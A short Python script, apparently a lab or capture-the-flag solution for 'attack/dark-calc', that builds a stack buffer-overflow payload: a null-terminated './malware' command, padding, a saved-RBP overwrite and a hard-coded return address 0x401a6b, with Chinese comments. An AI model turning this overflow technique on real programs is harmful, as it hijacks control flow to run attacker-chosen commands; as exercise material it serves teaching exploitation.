#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc."""
import sys

#16字节缓冲区：命令+\x00结束符+6字节填充
payload  = b"./malware\x00" + b"A" * 6
#覆盖保存的RBP
payload += b"B" * 8
#覆盖input的返回地址为 0x401a6b
payload += b"\x6b\x1a\x40\x00\x00\x00\x00\x00"
payload += b"\n"

sys.stdout.buffer.write(payload)